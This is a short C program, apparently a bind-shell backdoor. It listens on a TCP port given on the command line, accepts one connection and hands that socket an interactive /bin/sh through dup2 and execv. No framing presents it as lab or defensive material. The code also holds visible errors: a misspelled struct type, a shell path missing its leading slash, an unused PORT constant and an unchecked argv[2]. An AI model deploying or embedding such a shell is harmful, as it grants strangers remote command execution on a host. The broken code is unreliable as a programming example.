#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define PORT 9000

int server_init(int port){
	int i, x;
	socklen_t clen;
	struct socladdr_in serv, client;

	if((i = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		perror("Socket:");
		exit(EXIT_FAILURE);
	}

	serv.sin_family = AF_INET;
	serv.sin_port = htons(port);
	serv.sin_addr.s_addr = htonl(INADDR_ANY);

	if((bind(i, (struct sockaddr *)&serv, sizeof(struct sockaddr_in))) < 0){
		perror("Bind:");
		exit(EXIT_FAILURE);
	}

	if((listen(i, 10)) < 0){
		perror("Listen:");
		exit(EXIT_FAILURE);
	}

	clen = sizeof(struct sockaddr_in);
	
	if((x = accept(i, (struct sockaddr *) &client, &clen)) < 0){
		perror("Accept:");
		exit(EXIT_FAILURE);
	}

	return x;
}

int start_shell(int i){
	char *name[3];

	dup2(i, 0);
	dup2(i, 1);
	dup2(i, 2);

	name[0] = "bin/sh";
	name[1] = "-i";
	name[2] = NULL;
	execv(name[0], name);

	exit(1);

	return 0;
}

int main(int argc, char *argv[]){
		start_shell(server_init(atoi(argv[2])));
	
	/*while (1){
		printf("[srv]: idle\n");
		sleep(2);
	}*/
	
	return 0;
}
